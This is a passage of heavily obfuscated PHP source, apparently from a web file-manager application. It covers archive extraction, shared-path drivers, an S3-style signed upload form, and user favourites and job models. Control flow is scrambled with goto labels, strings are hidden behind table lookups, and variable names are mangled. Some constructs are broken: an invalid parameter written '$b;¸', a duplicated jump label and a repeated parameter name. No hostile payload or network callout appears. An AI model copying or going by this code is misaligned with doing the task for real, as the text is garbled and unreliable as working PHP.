0; $Bſ < count($FѲ); $Bſ++) { $aޫ = $FѲ[$Bſ]; if ($aޫ[$e[1878]] == $e[1879] || $aޫ[$e[1878]] == $e[1880]) { continue; } if ($dď) { $aޫ[$e[1881]] = ltrim($aޫ[$e[1881]], $e[1130]); } if ($aޫ[$e[1878]] == $e[1882]) { $aޫ[$e[76]] = !0; } else { $aޫ[$e[76]] = !1; } $aޫ[$e[1019]] = $Bſ; $d[] = $aޫ; } } else { if (self::checkIfType($e, $e[1028])) { $AɈ = kodRarArchive::listContent($d쓧); if (!$AɈ[$e[1015]]) { return $AɈ; } else { $d = $AɈ[$e[1017]]; } } else { if (kodZipArchive::support($e[350])) { $d = kodZipArchive::listContent($d쓧); } else { $fƤ = new PclZip($d쓧); $d = $fƤ->listContent(); } } } if ($d) { $cՂ = unzip_charset_get($d); $dď = $dď && function_exists($e[65]); for ($Bſ = 0; $Bſ < count($d); $Bſ++) { $d[$Bſ][$e[1881]] = str_replace(array($e[1055], $e[1883]), $e[754], $d[$Bſ][$e[1881]]); if ($dď) { $d[$Bſ][$e[1881]] = iconv_to($d[$Bſ][$e[1881]], $cՂ, $e[322]); unset($d[$Bſ][$e[1884]]); } } return array($e[1015] => !0, $e[1017] => $d); } else { return array($e[1015] => !1, $e[1017] => $d); } } static function extract($cԒӞ, $Dޮߡ, $a貱۴ = "\x2d\x31", &$A = false) { goto f; f: if (self::checkIfType($c܍Ȑ, $EӚ[1863])) { if ($a貱۴ != $EӚ[1014]) { $Eڣ = unzip_pre_name($Eڣ); $eԇم = unzip_pre_name($eԇم); $b㱍 = PclTarExtractList($cԒӞ, array($Eڣ), $Dޮߡ, $eԇم, $c܍Ȑ); } else { $b㱍 = PclTarExtract($cԒӞ, $Dޮߡ, $EӚ[357], $c܍Ȑ); } return array($EӚ[1015] => $b㱍, $EӚ[1017] => PclErrorString(!0)); } else { if (self::checkIfType($c܍Ȑ, $EӚ[1028])) { return kodRarArchive::extract($cԒӞ, $Dޮߡ, $c܍Ȑ, $A); } else { if (kodZipArchive::support($EӚ[1885])) { return kodZipArchive::extract($cԒӞ, $Dޮߡ, $A); } else { $c = new PclZip($cԒӞ); if ($a貱۴ != $EӚ[1014]) { $b㱍 = $c->extract(PCLZIP_OPT_PATH, $Dޮߡ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EӚ[1886], PCLZIP_OPT_BY_NAME, $eҹ[$EӚ[1881]], PCLZIP_OPT_REMOVE_PATH, $eԇم, PCLZIP_OPT_REPLACE_NEWER); } else { $b㱍 = $c->extract(PCLZIP_OPT_PATH, $Dޮߡ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EӚ[1886], PCLZIP_OPT_REPLACE_NEWER); } return array($EӚ[1015] => $b㱍, $EӚ[1017] => $c->errorName(!0)); } } } return array($EӚ[1015] => !1, $EӚ[1017] => $EӚ[1887]); goto a͜; e: $FϺ = self::listContent($cԒӞ, !1); if (!$FϺ[$EӚ[1015]]) { return $FϺ; } if ($a貱۴ != $EӚ[1014]) { goto Eꍨ; Eꍨ: $eҹ = self::fileIndex($FϺ[$EӚ[1017]], $a貱۴); $A = str_replace(array($EӚ[1055], $EӚ[1883]), $EӚ[70], $eҹ[$EӚ[1881]]); $Eڣ = $A; goto D׻ݧ; D׻ݧ: if ($GLOBALS[$EӚ[6]][$EӚ[1128]] != $EӚ[322]) { $Eڣ = unzip_pre_name($A); } $eԇم = get_path_father($A); if ($eԇم == $A) { $eԇم = $EӚ[33]; } goto F; F: if ($eҹ[$EӚ[76]]) { $Eڣ = rtrim($Eڣ, $EӚ[8]) . $EӚ[8]; $A = array($A); } $b饶 = str_replace($EӚ[93], $EӚ[8], $Eڣ); if (substr($b饶, -1) == $EӚ[8]) { if (!strstr(trim($b饶, $EӚ[8]), $EӚ[8])) { $Dޮߡ = $Dޮߡ . get_path_this($b饶) . $EӚ[8]; } } else { if ($eԇم == $Eڣ) { $eԇم = $EӚ[33]; } } goto A嬮; A嬮: } goto f; f: $EӚ =& $_SERVER[ԥ]; self::init(); $c܍Ȑ = !empty($GLOBALS[$EӚ[1032]]) ? $GLOBALS[$EӚ[1032]] : get_path_ext($cԒӞ); goto e; a͜: } static function fileIndex($Cȥ, $f, $Dɯ = false) { goto aꏵ; cѮ: $d = $eڙ; if ($Dɯ) { $d = $eڙ[$Dɯ]; if ($eڙ[$aףљ[76]]) { $d = rtrim($d, $aףљ[8]) . $aףљ[8]; } } return $d; goto Eʝ; f: $a⮺ = count($Cȥ); for ($eėώ = 0; $eėώ < $a⮺; $eėώ++) { if ($f == $Cȥ[$eėώ][$aףљ[1019]]) { $eڙ = $Cȥ[$eėώ]; break; } } if (!$eڙ) { show_tips($aףљ[1888]); } goto cѮ; aꏵ: $aףљ =& $_SERVER[ԥ]; self::init(); if (!is_array($Cȥ)) { return !1; } goto f; Eʝ: } static function extractZipFile($bܽ, $C, $f = false) { goto fǏØ; E: if (file_exists($f)) { return $f; } $Cആ = new PclZip($bܽ); $Dūߴ = unzip_filter_ext($D첫 . get_path_this($C)); goto BҩҮȮ; fǏØ: $f =& $_SERVER[ԥ]; self::init(); $D첫 = TEMP_FILES . hash_path($bܽ) . $f[8]; goto E; bΣ: if (!file_exists($Dūߴ)) { return !1; } @rename($Dūߴ, $f); return $f; goto aկ; BҩҮȮ: $aǷѴ = get_path_father($C); if ($aǷѴ == $C) { $aǷѴ = $f[33]; } $e̊䇅 = $Cആ->extract(PCLZIP_OPT_PATH, $D첫, PCLZIP_CB_PRE_FILE_NAME, $f[1886], PCLZIP_OPT_REMOVE_PATH, $aǷѴ, PCLZIP_OPT_BY_NAME, $C); goto bΣ; E: mk_dir($D첫); $f = $D첫 . md5($bܽ . $C); if ($f) { $f = $D첫 . $f; } goto E; aկ: } static function filePreview($b, $e̎θ, $A = false, $fՈ = false) { goto BЦ; C: $eɩ = self::extract($b, $Fƿ, $e̎θ, $e脿); if (is_array($e脿)) { show_json($C[1889], !1); } if (file_exists($CÅ)) { IO::fileOut($CÅ, $A, get_path_this($e脿)); return; } goto FĶ֧; FĶ֧: $e脿 = unzip_pre_name($e脿); $c؊ = get_path_this($e脿); $c፮ = unzip_filter_ext($Fƿ . $c؊); goto A; F: if (!file_exists($CÅ)) { del_dir($Fƿ); show_json($C[1891]); } IO::fileOut($CÅ, $A, $c؊); goto c獖; A: if (!$eɩ[$C[1015]]) { show_json($eɩ[$C[1017]], !1); } if (!file_exists($c፮)) { show_json($C[1890], !1); } @rename($c፮, $CÅ); goto F; BЦ: $C =& $_SERVER[ԥ]; self::init(); $Fƿ = TEMP_FILES . hash_path($b) . $C[8]; goto D; D: mk_dir($Fƿ); $CÅ = $Fƿ . md5($b . $e̎θ . $fՈ); $e脿 = $C[33]; goto C; c獖: } static function create($d, $Dӎ) { $Eϼ =& $_SERVER[ԥ]; self::init(); $F͏ = get_path_ext($d); $d = !1; if (self::checkIfType($F͏, $Eϼ[297])) { if (kodZipArchive::support($Eϼ[993])) { return kodZipArchive::create($d, $Dӎ); } $a = new PclZip($d); foreach ($Dӎ as $b => $fח) { $fח = str_replace($Eϼ[463], $Eϼ[8], $fח); $a = Kodio::clear(get_path_father($fח)); if ($b == 0) { $d = $a->create($fח, PCLZIP_OPT_REMOVE_PATH, $a, PCLZIP_CB_PRE_FILE_NAME, $Eϼ[1892]); continue; } $d = $a->add($fח, PCLZIP_OPT_REMOVE_PATH, $a, PCLZIP_CB_PRE_FILE_NAME, $Eϼ[1892]); } } else { if (self::checkIfType($F͏, $Eϼ[1863])) { foreach ($Dӎ as $b => $fח) { $fח = str_replace($Eϼ[463], $Eϼ[8], $fח); $a = Kodio::clear(get_path_father($fח)); if ($b == 0) { $d = PclTarCreate($d, array($fח), $F͏, null, $a); continue; } $d = PclTarAddList($d, array($fח), $Eϼ[33], $a, $F͏); } } } return $d; } } goto DȞ; Fň: class PathDriverDriverShareItem { public function __construct($Bت) { $this->pathParse = $Bت; } public function __call($b, $fӌ) { $F =& $_SERVER[ԥ]; if (method_exists($this, $b)) { return; } $cո = call_user_func_array(array($F[1100], $b), $fӌ); $F퍥 = array($F[1101], $F[1102], $F[1103], $F[1104], $F[486], $F[488], $F[1105], $F[102], $F[1106], $F[1107]); if (in_array($b, $F퍥)) { $cո = $this->getPathOuter($cո); } return $cո; } public function copy($B, $B, $Fɶý = false) { return $this->copyMove($B, $B, $Fɶý, $_SERVER[ԥ][486]); } public function move($b;¸, $CǞ᦭, $fˋ = false) { return $this->copyMove($b;¸, $CǞ᦭, $fˋ, $_SERVER[ԥ][488]); } private function copyMove($B٥, $Bꫝ䤲, $BƄ, $A٨) { goto a߂; a߂: $e =& $_SERVER[ԥ]; $Dߣ = $Bꫝ䤲; $fǾ = IO::driverMake($Bꫝ䤲); goto Aً; EĈȔ: return $dÔ; goto bއ; Aً: if ($fǾ->pathParse[$e[981]]) { $Bꫝ䤲 = $fǾ->pathParse[$e[981]]; } else { $Bꫝ䤲 = $Dߣ; } $dÔ = IO::copyMove($B٥, $Bꫝ䤲, $BƄ, $A٨); $dÔ = $this->getPathOuter($dÔ); goto EĈȔ; bއ: } public function pathFather($b߈) { return get_path_father($this->pathParse[$_SERVER[ԥ][75]]); } public function iconvSystem($c) { return $c; } protected function infoParse($D惙ω) { $a =& $_SERVER[ԥ]; $AكŘ = $this->pathParse[$a[435]][$a[1001]] . $this->pathParse[$a[994]]; $Bϐ貒 = IO::info($AكŘ); $a酨 = $this->pathParse[$a[435]]; return Action($a[1099])->_shareItemeParse($Bϐ貒, $a酨); } public function listAll($Aҗ) { $F =& $_SERVER[ԥ]; $c = IO::listAll($Aҗ); $c挤ã = $this->pathParse[$F[435]]; foreach ($c as &$A㽺) { check_abort(); $A㽺 = array_merge(IO::info($A㽺[$F[75]]), $A㽺); $A㽺[$F[387]] = Action($F[1099])->_shareItemeParse($A㽺, $c挤ã); } return $c; } public function getPathOuter($Dץ) { goto Eĥ; Eĥ: $E =& $_SERVER[ԥ]; $Bߡ׸ = KodIO::parse($Dץ); if ($Bߡ׸[$E[29]] == KodIO::KOD_SHARE_ITEM) { return $Bߡ׸[$E[75]]; } goto Dݿ; D: if (substr($dӚ, 0, strlen($Eўޱ)) != $Eўޱ) { return !1; } return $this->pathParse[$E[995]] . $E[8] . ltrim($b, $E[8]); goto Aᴸ; Dݿ: $dӚ = KodIO::clear($Dץ); $Eўޱ = KodIO::clear($this->pathParse[$E[435]][$E[1001]]); $b = substr($dӚ, strlen($Eўޱ)); goto D; Aᴸ: } public function getType() { $E쬞 =& $_SERVER[ԥ]; $a = str_replace($E쬞[71], $E쬞[33], get_class($this)); return strtolower($a); } public function isTypeObject($aܔ) { return IO::isTypeObject($aܔ); } public function info($a򅝷¯) { return $this->infoParse($a򅝷¯); } public function infoAuth($bԻ넋) { return $this->infoParse($bԻ넋); } public function infoWithChildren($Cî) { return $this->infoParse($Cî); } public function infoFull($fûϱ) { return $this->infoParse($fûϱ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($e疆) { $this->pathParse = $e疆; } protected function infoParse($c󢡼) { $cࠔ =& $_SERVER[ԥ]; return Action($cࠔ[1000])->sharePathInfo($this->pathParse[$cࠔ[75]], !0); } public function listPath($d, $b² = false) { $c =& $_SERVER[ԥ]; $dы = IO::listPath($d, $b²); foreach ($dы as $a => $f) { if (!in_array($a, array($c[73], $c[74]))) { continue; } foreach ($f as $DߴÄ => $E) { $E = Action($c[1108])->parsePathChildren($E, array($c[383] => $d)); $dы[$a][$DߴÄ] = Action($c[1000])->shareItemInfo($E); } } return $dы; } public function listAll($d) { $e듒 =& $_SERVER[ԥ]; $Aٰ = IO::listAll($d); foreach ($Aٰ as &$D) { $D = array_merge(IO::info($D[$e듒[75]]), $D); $D[$e듒[387]] = Action($e듒[1000])->shareItemInfo($D); } return $Aٰ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($f܂߆) { parent::__construct($f܂߆); $this->signatureVersion($_SERVER[ԥ][196]); } public function uploadFormData($bǳ, $bš = 3600) { goto B⿅; c㔂: $c̴ = $EЃ[59]; $C = gmdate($EЃ[1110]); $aه = gmdate($EЃ[674]); goto BƎڎ; c: $Dݴ = array($this->accessKey, $aه, $this->region, $c̴, $Aߌ); $dމ = implode($EЃ[8], $Dݴ); $B = array($EЃ[1078] => gmdate($EЃ[1077], strtotime($EЃ[1112])), $EЃ[1079] => array(array($EЃ[1081] => $this->bucket), array($EЃ[1080] => $Aګ), array($EЃ[1082], $EЃ[1083], $EЃ[33]), array($EЃ[1082], $EЃ[1113], $EЃ[33]), array($EЃ[1082], $EЃ[1114], $EЃ[33]), array($EЃ[1084] => $c֌), array($EЃ[1115] => $dމ), array($EЃ[1116] => $bِ), array($EЃ[1117] => $C), array($EЃ[1118] => $fϙ))); goto fЅ; A: $Fǧē = array($EЃ[195] => $EЃ[33], $EЃ[1121] => $EЃ[33], $EЃ[1080] => $Aګ, $EЃ[1084] => $c֌, $EЃ[1088] => $b΍, $EЃ[1122] => $dމ, $EЃ[1123] => $bِ, $EЃ[1124] => $C, $EЃ[1125] => $fϙ, $EЃ[1126] => $aҶˡ, $EЃ[165] => $this->getHost()); return $Fǧē; goto Cƪ; fЅ: $b΍ = base64_encode(json_encode($B)); $B = hash_hmac($EЃ[1119], $aه, $EЃ[1120] . $this->secret, !0); $ḏ = hash_hmac($EЃ[1119], $this->region, $B, !0); goto D˽观; D˽观: $F = hash_hmac($EЃ[1119], $c̴, $ḏ, !0); $cݘ = hash_hmac($EЃ[1119], $Aߌ, $F, !0); $aҶˡ = hash_hmac($EЃ[1119], $b΍, $cݘ); goto A; B⿅: $EЃ =& $_SERVER[ԥ]; $Aګ = $EЃ[181]; $bِ = $EЃ[1109]; goto c㔂; BƎڎ: $Aߌ = $EЃ[1111]; $fϙ = $bš . $EЃ[33]; $c֌ = $EЃ[1076]; goto c; Cƪ: } } goto B֎; F: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x74\141\163\153\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\164\x79\160\145", "\145\x76\x65\x6e\164", "\x74\151\155\x65", "\144\145\x73\143", "\163\171\x73\164\145\155", "\145\x6e\x61\x62\154\x65", "\x6c\141\x73\164\122\165\x6e", "\163\157\x72\x74"); public function listData($BΏ = false, $F = "\x73\x6f\162\x74", $d̓، = false) { return parent::listData($BΏ, $F, $d̓،); } public function add($E) { $Fփ =& $_SERVER[ԥ]; $a = $this->findByName($E[$Fփ[28]]); if ($a) { return !1; } $E[$Fփ[1369]] = 0; $E[$Fփ[2087]] = $this->getSort(); return parent::insert($E); } private function getSort() { $E݉ =& $_SERVER[ԥ]; $E檒 = parent::listData(); $ĖŲ = array_to_keyvalue($E檒, $E݉[33], $E݉[2087]); return empty($ĖŲ) ? 0 : max($ĖŲ) + 1; } public function update($A䪔, $dؿ) { $F뿔 =& $_SERVER[ԥ]; $bפ = $this->listData($A䪔); $Fǉՠ = $this->findByName($dؿ[$F뿔[28]]); if (!$bפ || $Fǉՠ && $Fǉՠ[$F뿔[363]] != $bפ[$F뿔[363]]) { return !1; } return parent::update($A䪔, $dؿ); } public function remove($cĊކ, $fڠݵ = false) { $Fロ㸧 =& $_SERVER[ԥ]; $C됐 = $this->listData($cĊކ); if (!$C됐) { return; } if (!$fڠݵ && $C됐[$Fロ㸧[1063]] == $Fロ㸧[83]) { return !1; } return parent::remove($cĊކ); } public function enable($b, $A) { return $this->update($b, array($_SERVER[ԥ][2437] => $A)); } public function run($b) { return $this->update($b, array($_SERVER[ԥ][2447] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($Cקѭ) { $Cƴ֔Ŋ =& $_SERVER[ԥ]; return array($Cƴ֔Ŋ[2448] => array(USER_ID, $Cƴ֔Ŋ[2449])); } protected function listData() { $cοͮ =& $_SERVER[ԥ]; $d֐ = array($cοͮ[1395] => USER_ID, $cοͮ[432] => 0); $a = $cοͮ[2450]; $A؎ = $this->field($a)->where($d֐)->order($cοͮ[2451])->select(); return $A؎ ? $A؎ : array(); } protected function resetCache() { } protected function listView() { goto e; bГ: $d = array_to_keyvalue($E唼Ɗ, $Cբ[33], $Cբ[75]); if (!$d) { return $E; } $D𸉻 = 2000; goto AƤ; Cȿ: $fߩ = array_to_keyvalue($fߩ, $Cբ[365]); foreach ($E as $Bȉ鳏 => $E𱂝) { $Cꏏ֛ = $fߩ[$E𱂝[$Cբ[75]]]; $Cꏏ֛ = $Cꏏ֛ ? $Cꏏ֛ : array(); $E[$Bȉ鳏] = array_merge($Cꏏ֛, $E𱂝); } return $E; goto Dύ; AƤ: $Bߏޖ = array($Cբ[379] => array($Cբ[380], $d)); $fߩ = Model($Cբ[744])->listSource($Bߏޖ, $D𸉻); $fߩ = array_merge($fߩ[$Cբ[73]], $fߩ[$Cբ[74]]); goto Cȿ; e: $Cբ =& $_SERVER[ԥ]; $E = $this->listData(); $E唼Ɗ = array_filter_by_field($E, $Cբ[29], $Cբ[378]); goto bГ; Dύ: } protected function addFav($B, $Dگ˪ޅ = '', $cɉ = "\x73\x6f\x75\162\143\145") { goto BˆΪ; Eӵ: return $this->add($Cæۄ); goto CӠӤ; BˆΪ: $Bա =& $_SERVER[ԥ]; $eɉˉ = array($Bա[1395] => USER_ID, $Bա[432] => 0, $Bա[384] => $cɉ, $Bա[383] => $B); if ($this->where($eɉˉ)->find()) { return !1; } goto Cą; f: if (!$Dگ˪ޅ && $cɉ == $Bա[378]) { $A = Model($Bա[1093])->where(array($Bա[379] => $B))->find(); if (!$A) { return !1; } $Dگ˪ޅ = $A[$Bա[28]]; } $Dگ˪ޅ = $this->getAutoName($Dگ˪ޅ); $Cæۄ = array($Bա[1395] => USER_ID, $Bա[432] => 0, $Bա[382] => $Dگ˪ޅ, $Bա[383] => $B, $Bա[384] => $cɉ, $Bա[2070] => $e + 1); goto Eӵ; Cą: $eɉˉ = array($Bա[1395] => USER_ID, $Bա[432] => 0); $e = $this->where($eɉˉ)->max($Bա[2087]); if (!$e) { $e = 0; } goto f; CӠӤ: } protected function remove($BӘ) { $cӲ =& $_SERVER[ԥ]; $D = array($cӲ[1395] => USER_ID, $cӲ[381] => $BӘ); return $this->where($D)->delete(); } protected function removeByName($d͛) { $Bʯۉ =& $_SERVER[ԥ]; $Fꏤ = array($Bʯۉ[1395] => USER_ID, $Bʯۉ[382] => $d͛, $Bʯۉ[432] => 0); return $this->where($Fꏤ)->delete(); } protected function rename($BÜڐ, $fˡڎ) { $B =& $_SERVER[ԥ]; if ($BÜڐ == $fˡڎ) { return !1; } $C͕ = $this->getAutoName($fˡڎ); if ($fˡڎ != $C͕) { return !1; } $c˭ = array($B[1395] => USER_ID, $B[432] => 0, $B[28] => $BÜڐ); return $this->where($c˭)->save(array($B[28] => $fˡڎ)); } protected function resetSort($d) { $eЭ =& $_SERVER[ԥ]; $d = is_array($d) ? $d : array(); $bڕ = array($eЭ[1395] => USER_ID); for ($Cό = 0; $Cό < count($d); $Cό++) { $bڕ[$eЭ[381]] = $d[$Cό]; $this->where($bڕ)->save(array($eЭ[2070] => $Cό + 1)); } return !0; } protected function moveTop($eܴԉ) { goto eѹ; bɉ: return $this->resetSort($DӃ); goto cݪ; B: $EÔ = $DӃ; $DӃ = array_remove_value($DӃ, $EԶ[$b[363]]); array_unshift($DӃ, $EԶ[$b[363]]); goto bɉ; eѹ: $b =& $_SERVER[ԥ]; $cū = array($b[1395] => USER_ID, $b[432] => 0); $EԶ = $this->where($cū)->where(array($b[28] => $eܴԉ))->find(); goto D; D: if (!$EԶ) { return; } $DӃ = $this->field($b[363])->where($cū)->order($b[2451])->select(); $DӃ = array_to_keyvalue($DӃ, $b[33], $b[363]); goto B; cݪ: } protected function moveBottom($B̓) { $b㏂ =& $_SERVER[ԥ]; $C㊩ = array($b㏂[1395] => USER_ID, $b㏂[432] => 0); $dφ = $this->where($C㊩)->max($b㏂[2087]); $Fˋ = array($b㏂[2087] => $dφ + 1); return $this->where($C㊩)->where(array($b㏂[28] => $B̓))->save($Fˋ); } private function getAutoName($b) { goto C۱І; BȖ: return $b . "\50{$Bʔ}\x29"; goto d񊥛; fǟ: $f = array_to_keyvalue($f, $A漍[33], $A漍[28]); if (!$f || !in_array($b, $f)) { return $b; } for ($Bʔ = 0; $Bʔ < count($f); $Bʔ++) { if (!in_array($b . "\50{$Bʔ}\x29", $f)) { return $b . "\50{$Bʔ}\51"; } } goto BȖ; C۱І: $A漍 =& $_SERVER[ԥ]; $f = array($A漍[1395] => USER_ID, $A漍[432] => 0); $f = $this->field($A漍[28])->where($f)->select(); goto fǟ; d񊥛: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x6a\x6f\142\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\x64\145\163\x63", "\163\157\x72\164"); const JOB_KEY = "\163\x65\154\x66\x4a\x6f\x62\x4c\x69\163\x74"; public function listData($Cҿ = false, $d = "\163\x6f\x72\164", $B = false) { return parent::listData($Cҿ, $d, $B); } public function remove($d) { return parent::remove($d); } public function add($cΉ) { $Cԏ =& $_SERVER[ԥ]; if ($this->findByName($cΉ[$Cԏ[28]])) { return !1; } $cΉ[$Cԏ[2087]] = $this->getSort(); return parent::insert($cΉ); } private function getSort() { $Dڮ =& $_SERVER[ԥ]; $eъ = parent::listData(); $f = array_to_keyvalue($eъ, $Dڮ[33], $Dڮ[2087]); return empty($f) ? 0 : max($f) + 1; } public function update($a׭, $C) { $D֎ =& $_SERVER[ԥ]; $Aē옉 = parent::listData($a׭); $c߂ = $this->findByName($C[$D֎[28]]); if (!$Aē옉 || $c߂ && $c߂[$D֎[363]] != $Aē옉[$D֎[363]]) { return !1; } return parent::update($a׭, $C); } public function setUserJob($EΩĖ, $dسӄ) { goto b; b: $Aʍ =& $_SERVER[ԥ]; if (!is_array($dسӄ)) { $dسӄ = array($dسӄ); } $b鯋 = parent::listData(); goto fŧ; fŧ: $b = array_to_keyvalue($b鯋, $Aʍ[28]); $a莺 = $Aʍ[357]; foreach ($dسӄ as $F̧) { if ($b[$F̧]) { $a莺 .= $b[$F̧][$Aʍ[363]] . $Aʍ[47]; } else { $Bא = $this->add($F̧); $a莺 .= $Bא . $Aʍ[47]; } } goto e; e: $a莺 = rtrim($a莺, $Aʍ[47]); Model($Aʍ[473])->metaSet($EΩĖ, self::JOB_KEY, $a莺); goto f؇斮; f؇斮: } public function getUserJob($fҳ) { $cى = Model($_SERVER[ԥ][473])->metaGet($fҳ); return $this->getUserJobInfo($cى[self::JOB_KEY]); } public function getUserJobInfo($C) { goto D،Ѡ; D،Ѡ: $dܲ =& $_SERVER[ԥ]; $fݣ = explode($dܲ[47], $C); $Cז = parent::listData(); goto c; d: return $Dԛˆ; goto bӆ; c: $Cז = array_remove_key($Cז, $dܲ[183]); $Dԛˆ = array(); foreach ($fݣ as $dⒻ) { if (isset($Cז[$dⒻ])) { $Dԛˆ[] = $Cז[$dⒻ]; } } goto d; bӆ: } } goto CбЙ; Aƒð: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Eꆛ =& $_SERVER[ԥ]; $this->objectDriver = array($Eꆛ[57], $Eꆛ[58], $Eꆛ[59], $Eꆛ[60], $Eꆛ[61], $Eꆛ[62], $Eꆛ[63], $Eꆛ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Aǔ߃) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Aǔ߃, $_SERVER[ԥ][8]); } return $Aǔ߃; } public function getPathName($cϥϢʍ) { return $cϥϢʍ; } public function iconvApp($b) { return $b; } public function iconvSystem($aʇԆ) { return $aʇԆ; } public function iconvTo($f, $Cƛ, $e绡Ǯ) { goto Bߩ; Bߩ: $d줻 =& $_SERVER[ԥ]; if (!$f || !function_exists($d줻[65])) { return $f; } static $dǥɉ = array(); goto f; Bݝ: $D = $D ? $D : $f; if (strstr($D, $d줻[69])) { $D = str_replace($d줻[69], $d줻[70], $D); } $dǥɉ[$Cƛ . $d줻[66] . $e绡Ǯ . $d줻[67] . $f] = $D; goto Fļ; Fļ: $dǥɉ[$e绡Ǯ . $d줻[66] . $Cƛ . $d줻[67] . $f] = $f; $dǥɉ[$e绡Ǯ . $d줻[66] . $Cƛ . $d줻[67] . $D] = $f; $dǥɉ[$Cƛ . $d줻[66] . $e绡Ǯ . $d줻[67] . $D] = $D; goto e; f: $EɊ = $Cƛ . $d줻[66] . $e绡Ǯ . $d줻[67] . $f; if (isset($dǥɉ[$EɊ])) { return $dǥɉ[$EɊ]; } if (function_exists($d줻[68])) { $D = @mb_convert_encoding($f, $e绡Ǯ, $Cƛ); } else { $D = @iconv($Cƛ, $e绡Ǯ, $f); } goto Bݝ; e: return $D; goto Fҭ; Fҭ: } public function getPathInner($DҲ׎ܵ) { $Dҙ = IO::init($DҲ׎ܵ); return $Dҙ->path; } public function getPathOuter($AÝ) { $C傞ǆ =& $_SERVER[ԥ]; $C픉 = strlen(trim($this->pathBase, $C傞ǆ[8])); $AÝ = substr(trim($AÝ, $C傞ǆ[8]), $C픉); return $this->pathDriver . $C傞ǆ[8] . ltrim($AÝ, $C傞ǆ[8]); } public function isParentOf($A߭ʏ, $B̪) { $Eʼ =& $_SERVER[ԥ]; $A߭ʏ = rtrim(strtolower($A߭ʏ), $Eʼ[8]) . $Eʼ[8]; $B̪ = rtrim(strtolower($B̪), $Eʼ[8]) . $Eʼ[8]; $F = strpos($B̪, $A߭ʏ) === 0; return $F; } public function getType() { $D =& $_SERVER[ԥ]; $F = str_replace($D[71], $D[33], get_class($this)); return strtolower($F); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fÂ, $dϓ) { $F =& $_SERVER[ԥ]; $e = rtrim($fÂ, $F[8]) . $F[8] . $dϓ; $Cⱎ = $this->exist($e); return $Cⱎ ? $e : !1; } public function renameObject($cֲ, $d߅Ҍ) { goto c; c: $E =& $_SERVER[ԥ]; $aɔ讉 = $d߅Ҍ; Hook::trigger($E[72], $this, $cֲ, $this, $this->pathFather($cֲ) . $d߅Ҍ); goto eة܋; eة܋: $cֲ = $this->getPathOuter($cֲ); $d߅Ҍ = $this->pathFather($cֲ) . $d߅Ҍ; if (IO::isFile($cֲ)) { $f冶 = IO::copy($cֲ, $this->pathFather($cֲ), REPEAT_RENAME_FOLDER, $aɔ讉); if ($f冶) { IO::remove($cֲ); } } else { $f冶 = IO::mkdir($d߅Ҍ); if (!$f冶) { return !1; } $cޑ = IO::listPath($cֲ, !0); $F = array_merge($cޑ[$E[73]], $cޑ[$E[74]]); foreach ($F as $A󊈊) { IO::move($A󊈊[$E[75]], $d߅Ҍ, REPEAT_RENAME_FOLDER); } IO::remove($cֲ); } goto b흷Π; b흷Π: return $f冶 ? $d߅Ҍ : !1; goto A̛Ƌ; A̛Ƌ: } public function tempFile($E = '', $c = '') { goto fۈ; fۈ: if (!$E) { $E = rand_string(15); } $Fڌ = TEMP_FILES . rand_string(15) . $_SERVER[ԥ][8]; @mkdir($Fڌ, 511, !0); goto a杜; a杜: $EѲ = $Fڌ . $E; @touch($EѲ); if ($c) { file_put_contents($EѲ, $c); } goto cҸ; cҸ: return $EѲ; goto Cɢ󳙡; Cɢ󳙡: } public function tempFileRemve($Eʟǥ) { @unlink($Eʟǥ); @rmdir($this->pathFather($Eʟǥ)); } public function mkfile($Cփ, $D牨 = '', $dɣ = REPEAT_RENAME) { } public function mkdir($b, $cᑲ = REPEAT_SKIP) { } public function copyFile($EՔˤ, $C̅) { } public function moveFile($Eɐ, $E) { } public function remove($C֩Ӆ) { if ($this->isFile($C֩Ӆ)) { return $this->delFile($C֩Ӆ); } return $this->delFolder($C֩Ӆ); } public function rename($C۴, $A߆δ) { } public function exist($Cᯍ) { } public function findByHash($Eֻ䛉 = '', $b = '') { return !1; } public function isFile($fڑ) { } public function isFolder($e) { } public function size($a) { } public function info($fð) { } public function infoSimple($aӰ) { return $this->info($aӰ); } public function infoAuth($aȉ) { return $this->info($aȉ); } public function infoFull($C涇) { return $this->info($C涇); } public function infoWithChildren($EӪ؆) { $dۏ =& $_SERVER[ԥ]; $f쌋̔ = $this->info($EӪ؆); if ($f쌋̔ && $f쌋̔[$dۏ[29]] == $dۏ[76]) { $dݎĮ = array($dۏ[77] => 0, $dۏ[78] => 0, $dۏ[79] => 0); $this->infoChildren($EӪ؆, $dݎĮ); $f쌋̔[$dۏ[77]] = $dݎĮ[$dۏ[77]]; $f쌋̔[$dۏ[80]] = array($dۏ[81] => $dݎĮ[$dۏ[78]], $dۏ[82] => $dݎĮ[$dۏ[79]]); } return $f쌋̔; } public function listPath($b⏊, $a = false) { } public function has($C¢, $DЫ = false, $F = false) { } public function canRead($Aɿ) { } public function canWrite($a) { } public function getContent($B) { } public function setContent($eɌ, $dŸ̺ = '') { } protected function infoChildren($a, &$dɠ) { $Aǭಮϰ =& $_SERVER[ԥ]; check_abort(); $bԝ = $this->listPath($a, !0); $bԝ = array_merge($bԝ[$Aǭಮϰ[74]], $bԝ[$Aǭಮϰ[73]]); foreach ($bԝ as $cߏҊ) { if ($cߏҊ[$Aǭಮϰ[29]] == $Aǭಮϰ[76]) { $dɠ[$Aǭಮϰ[79]]++; $Fړʓ = $this->getPathInner($cߏҊ[$Aǭಮϰ[75]]); $this->infoChildren($Fړʓ, $dɠ); } else { $dɠ[$Aǭಮϰ[78]]++; $dɠ[$Aǭಮϰ[77]] += 